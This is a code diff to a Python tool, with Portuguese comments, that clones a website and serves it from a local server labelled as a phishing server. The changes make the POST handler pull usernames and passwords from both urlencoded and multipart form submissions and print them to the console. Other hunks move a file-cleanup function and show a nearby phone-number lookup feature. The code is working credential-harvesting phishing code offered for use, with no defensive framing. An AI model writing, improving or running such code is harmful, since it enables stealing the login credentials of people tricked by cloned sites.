@@ -7,8 +7,9 @@ import numlookupapi
 import time
 import webbrowser
 import requests
+import urllib.parse as urlparse
+import cgi
 from bs4 import BeautifulSoup
-import urllib.parse
 from colorama import init, Fore, Style
 
 # Função para limpar a tela do console
@@ -284,6 +285,14 @@ def clone_website(url, server_choice, language):
 
     except Exception as e:
         print(f"Error cloning website: {e}")
+        
+# Função para limpar os arquivos HTML e CSS
+def clean_up_files():
+    try:
+        os.remove('index.html')
+        os.remove('styles.css')
+    except Exception as e:
+        print(f"Error cleaning up files: {e}")
 
 # Função para executar o servidor local para phishing
 def run_local_server(target_url, language):
@@ -293,20 +302,17 @@ def run_local_server(target_url, language):
     else:
         print("Executando site de phishing em localhost...")
 
-    # Configurar o servidor HTTP local para servir os arquivos clonados
     class PhishingServer(http.server.BaseHTTPRequestHandler):
         def __init__(self, *args, **kwargs):
             super().__init__(*args, **kwargs)
 
         def do_GET(self):
-            # Servir arquivos index.html e styles.css
             try:
                 if self.path == '/':
                     self.path = '/index.html'
                 elif self.path == '/styles.css':
                     pass  # Lógica para servir o arquivo CSS
 
-                # Abrir e enviar o arquivo solicitado
                 with open(os.path.join('.', self.path[1:]), 'rb') as file:
                     self.send_response(200)
                     if self.path.endswith('.html'):
@@ -320,24 +326,24 @@ def run_local_server(target_url, language):
                 self.send_error(404, 'File Not Found: %s' % self.path)
 
         def do_POST(self):
-            # Capturar dados do formulário POST
+            content_type = self.headers['Content-Type']
             content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length).decode('utf-8')
+            post_data = self.rfile.read(content_length)
 
-            # Adicionar depuração para verificar os dados recebidos
+            # Adicionar depuração para visualizar os dados recebidos
             print("Received POST data:", post_data)
 
-            # Adicionar depuração para verificar o tipo de dados
-            print("Content-Type:", self.headers['Content-Type'])
-
-            # Analisar os dados POST para extrair credenciais
-            post_params = urllib.parse.parse_qs(post_data)
-            username = post_params.get('username', [''])[0]
-            password = post_params.get('password', [''])[0]
-
-            # Adicionar depuração para verificar os dados extraídos
-            print("Parsed username:", username)
-            print("Parsed password:", password)
+            if content_type.startswith('multipart/form-data'):
+                # Processar dados multipart/form-data
+                form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
+                username = form.getvalue('username', '')
+                password = form.getvalue('password', '')
+            else:
+                # Processar dados application/x-www-form-urlencoded
+                post_data = post_data.decode('utf-8')
+                post_params = urlparse.parse_qs(post_data)
+                username = post_params.get('username', [''])[0]
+                password = post_params.get('password', [''])[0]
 
             # Exibir credenciais no console
             if language == '1':
@@ -377,14 +383,6 @@ def run_local_server(target_url, language):
 
     except Exception as e:
         print(f"Error running local server: {e}")
-
-# Função para limpar os arquivos HTML e CSS
-def clean_up_files():
-    try:
-        os.remove('index.html')
-        os.remove('styles.css')
-    except Exception as e:
-        print(f"Error cleaning up files: {e}")
 
 # Função para informações de número de telefone
 def phone_number_info(language):
